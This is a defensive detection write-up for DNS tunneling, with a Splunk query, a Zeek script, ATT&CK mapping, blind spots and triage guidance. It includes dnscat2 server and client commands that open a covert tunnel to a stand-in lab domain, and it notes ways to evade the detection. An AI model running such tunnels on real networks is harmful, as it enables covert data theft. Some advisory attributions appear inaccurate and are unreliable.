# DNS Tunneling via High-Entropy Subdomains

<!--
Quality bar checklist — complete before committing:
  [x] SPL query is primary — includes performance notes
  [x] Sigma rule exists in sigma-to-spl/rules/ (not embedded here — reference path only)
  [x] Sigma rule expresses full logic, OR has caveat explaining what SPL adds
  [x] test-data/ directory alongside this file with malicious + benign sample logs
  [x] Threat-informed framing — tied to published actor/campaign reporting where possible
  [x] Blind spots are honest and specific
  [x] FP table has real triage guidance
-->

## Goal

Detect data exfiltration or C2 communication encoded in DNS query subdomains. Adversaries abuse DNS because it is rarely blocked and often poorly monitored — making it a reliable covert channel even in restricted environments where direct TCP egress is denied.

## ATT&CK Categorization

- **Tactic:** TA0011 — Command and Control
- **Tactic:** TA0010 — Exfiltration
- **Technique:** T1071.004 — Application Layer Protocol: DNS
- **Technique:** T1048 — Exfiltration Over Alternative Protocol

## Threat Context

DNS tunneling is a documented C2 and exfiltration primitive for several nation-state groups. OilRig (APT34, Iran-nexus) is the most extensively documented actor: Palo Alto Unit 42 and Trend Micro both reported APT34 using DNS-based C2 with tools including ALMA Communicator and DNSExfiltrator variants across operations in the Middle East and South Asia spanning 2017–2022. CISA advisory AA21-116A specifically identified DNS tunneling as an active APT34 technique. NSA/CISA joint advisory AA20-205A (Sandworm, Russia-nexus) also listed DNS covert channel use.

Beyond APT, DNS tunneling infrastructure appears routinely in criminal campaigns: BazarLoader (Conti affiliate tooling) used DNS TXT records for payload staging. The technique is also a staple of red team toolkits — Cobalt Strike's DNS beacon mode, iodine, dnscat2, and DNSExfiltrator all produce the same structural signal in Zeek dns.log.

## Strategy Abstract

DNS tunneling tools encode data as subdomains of an attacker-controlled authoritative domain. The encoded subdomains are typically long, high-entropy strings that look nothing like legitimate hostnames. This detection identifies DNS queries where the first subdomain label exceeds a length threshold and the query type is non-standard (TXT, NULL, CNAME — the record types tunneling tools prefer for payload capacity). Volume aggregation then surfaces hosts generating above-threshold query counts to the same parent domain.

The detection is deliberately layered:
- **Length filter (>40 characters):** Catches iodine, dnscat2, and DNSExfiltrator in default configuration. Subdomains of this length don't appear in legitimate A/AAAA resolution.
- **Query type filter (TXT/NULL/CNAME):** TXT records carry the largest response payload. NULL and CNAME are used by tools that need to avoid TXT-monitoring. Standard A/AAAA queries are retained for volume analysis only.
- **Volume threshold (>20 queries per window):** Catches repetitive C2 beaconing. Low-and-slow exfiltration may evade this; the length + type filters still apply at the per-event level.

A DNS allowlist lookup suppresses known high-entropy CDN and cloud infrastructure that would otherwise generate significant false positives.

## Technical Context

**Data source:** Zeek `dns.log` via Corelight App for Splunk — sourcetype `corelight_dns` or `bro_dns`

**Sigma rule:** [`rules/network/dns-tunneling-high-entropy-subdomains.yml`](https://github.com/cray44/sigma-to-spl/blob/main/rules/network/dns-tunneling-high-entropy-subdomains.yml) in sigma-to-spl

> The Sigma rule filters on query type (TXT/NULL/CNAME) and excludes internal domains. Sigma cannot express subdomain length extraction, Shannon entropy calculation, or volume aggregation across a time window. The SPL below adds these layers — treat it as the production query. The Sigma rule is the portable, SIEM-agnostic definition of the core behavioral signal.

**Key fields:**

| Field | Description |
|---|---|
| `query` | Full DNS query string — subdomain extraction and length evaluation applied here |
| `qtype_name` | Query type name — TXT, NULL, CNAME elevated; A/AAAA normal |
| `qtype` | Numeric query type — 16=TXT, 10=NULL, 5=CNAME |
| `answers` | DNS response content — large TXT payloads corroborate tunneling |
| `id.orig_h` | Source (internal) IP — the host making the queries |
| `id.resp_h` | Destination resolver IP — external resolver vs. internal resolver distinguishes bypass behavior |
| `rcode_name` | Response code — NOERROR on established tunnel; NXDOMAIN patterns on C2 infrastructure can also be relevant |
| `ts` | Zeek timestamp — used to bucket queries by time window for volume analysis |

**Environment assumptions:**
- Zeek is deployed at a network chokepoint with visibility into DNS queries (upstream of recursive resolver or mirrored)
- Zeek logs are forwarded to Splunk with standard Corelight or Zeek App field extraction
- A `dns_allowlist.csv` lookup exists in Splunk with known high-entropy CDN/cloud domains to suppress
- Internal domain suffixes are known and used to filter internal DNS resolution

## Performance Notes

- **Estimated event volume:** DNS is one of the highest-volume data sources in any environment — millions of events per day in a mid-size enterprise. The `qtype_name IN ("TXT","NULL","CNAME")` pre-filter reduces this by ~95%+ since TXT/NULL/CNAME queries represent a small fraction of normal DNS traffic. Post-filter volume is typically hundreds to low thousands of events per day.
- **Indexed fields:** `sourcetype` is indexed. `qtype_name` is extracted by the Corelight app — not indexed by default. If this detection runs slowly, consider creating a lookup-based pre-filter or adding `qtype_name` to the indexed extractions for `corelight_dns`.
- **Recommended time range:** `-60m` on a 15-minute schedule. DNS tunneling exfiltration generates sustained volume; a 1-hour window catches beaconing patterns that a 15-minute window might under-count. For high-confidence alerting on isolated long-subdomain events, a `-5m` real-time window on the length filter alone (without volume threshold) is also viable.
- **Acceleration:** Not recommended for the aggregated form — the query volume post-filter is low enough to run inline. If running the non-aggregated (per-event) form continuously, consider a summary index updated by a scheduled search.

## Blind Spots

- **Low-and-slow tunneling:** Adversaries keeping query volume below the count threshold and spreading queries across long windows evade the volume component. The length and type filters still fire per-event.
- **Encrypted DNS (DoH/DoT):** If clients resolve via DNS-over-HTTPS or DNS-over-TLS, Zeek `dns.log` won't see the queries. Requires proxy logs or EDR DNS telemetry as a supplementary source.
- **Subdomain splitting:** An adversary can split a long payload across multiple shorter subdomains per query (e.g., three 15-character labels), keeping each label below the length threshold while still exfiltrating the same data volume.
- **Legitimate high-entropy domains:** CDN providers (Akamai, CloudFront, Fastly), cloud services, and some telemetry platforms use long random-looking subdomains. Without a tuned allowlist this is the primary FP source.
- **Tunneling over A/AAAA:** Some tunneling tools (iodine in certain modes) encode data in A/AAAA query subdomains rather than TXT/CNAME. The query type filter won't catch this; only the length filter applies.

## False Positives

| False Positive | Triage Guidance |
|---|---|
| CDN subdomains (Akamai, CloudFront, Fastly) | Check parent domain against known CDN provider domain lists; traffic will be consistent across many hosts and correlate with web browsing |
| Software update infrastructure (Microsoft, Apple, Google) | Volume will be consistent and periodic across many hosts; parent domain will be recognizable infrastructure |
| Security tooling with DNS-based heartbeats (some EDR, threat intel feeds) | Source host will be consistent; cross-reference with asset inventory for known security tooling hosts |
| GUID-based internal hostnames | Parent domain will be an internal/owned domain — suppress by checking against internal domain suffix list |
| Certificate transparency / ACME challenge responses | Isolated TXT queries to `_acme-challenge.*` subdomains; filter by subdomain prefix pattern |

## Validation

**Test data:** See [`test-data/`](test-data/) alongside this file — includes malicious DNS tunneling events (dnscat2 profile) and benign high-entropy DNS queries (CDN traffic) as Zeek `dns.log` JSON.

Reproduce the malicious signal using [dnscat2](https://github.com/iagox86/dnscat2) in a lab environment:

```bash
# Server side — attacker-controlled authoritative resolver
ruby dnscat2.rb --dns "domain=tunnel.lab.local"

# Client side — victim host
./dnscat --dns "domain=tunnel.lab.local"
```

Expected result in Splunk: `corelight_dns` or `bro_dns` events where the first label of `query` exceeds 40 characters, `qtype_name` is TXT or NULL, sourced from a single internal host at a count above 20 within a 60-minute window.

**SPL (primary):**
```spl
sourcetype=corelight_dns OR sourcetype=bro_dns
| eval subdomain=mvindex(split(query, "."), 0)
| eval subdomain_len=len(subdomain)
| where subdomain_len > 40
    AND (qtype_name="TXT" OR qtype_name="NULL" OR qtype_name="CNAME")
| eval parent_domain=mvjoin(mvindex(split(query, "."), 1, -1), ".")
| lookup dns_allowlist.csv domain AS parent_domain OUTPUT is_allowed
| where isnull(is_allowed) OR is_allowed!="true"
| stats count, values(query) AS queries, dc(query) AS unique_queries
    BY _time, id.orig_h, parent_domain
| where count > 20
| sort - count
```

> The `eval subdomain` and `eval subdomain_len` steps run before the `where` filter — keep them in this order so the `where` clause can reference the computed field. The `lookup` and `where isnull(is_allowed)` pattern passes through rows with no match in the allowlist (the expected case) while suppressing confirmed CDN domains. SPL has no native Shannon entropy function; subdomain length >40 is an effective proxy that catches all common tunneling tool defaults.

**Zeek inline script (optional sensor-side pre-filter):**
```zeek
event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
    {
    local labels = split_string(query, /\./);
    if ( |labels| > 2 )
        {
        local subdomain = labels[0];
        if ( |subdomain| > 40 )
            NOTICE([$note=DNS::HighEntropySubdomain,
                    $conn=c,
                    $msg=fmt("Long subdomain in DNS query: %s", query)]);
        }
    }
```

## Response

1. Identify the source host (`id.orig_h`) and scope all DNS queries from it in the detection window — look for consistent parent domain and query type pattern
2. Check whether the queried parent domain resolves to an attacker-controlled authoritative nameserver (passive DNS, threat intel lookup, WHOIS registration age)
3. Correlate with endpoint telemetry: process making DNS calls, network connections to external resolvers, any process spawning a tunneling tool binary
4. If confirmed tunneling: isolate the host, capture PCAP if available, escalate to IR, revoke network access
5. If uncertain: flag for analyst review, check whether the host is a known CDN-heavy application server or has a security tool installed that explains the traffic pattern

## References

- [Palantir ADS Framework](https://github.com/palantir/alerting-and-detection-strategy-framework)
- [MITRE ATT&CK T1071.004](https://attack.mitre.org/techniques/T1071/004/)
- [Unit 42 — OilRig DNS Tunneling](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-dns-tunneling/)
- [CISA AA21-116A — Iranian Government-Sponsored APT Cyber Threats](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-116a)
- [dnscat2](https://github.com/iagox86/dnscat2)
- [Shannon entropy for DNS anomaly detection — SANS ISC](https://isc.sans.edu/diary/Detecting+DNS+Tunneling/19429)
- [Sigma rule](https://github.com/cray44/sigma-to-spl/blob/main/rules/network/dns-tunneling-high-entropy-subdomains.yml)
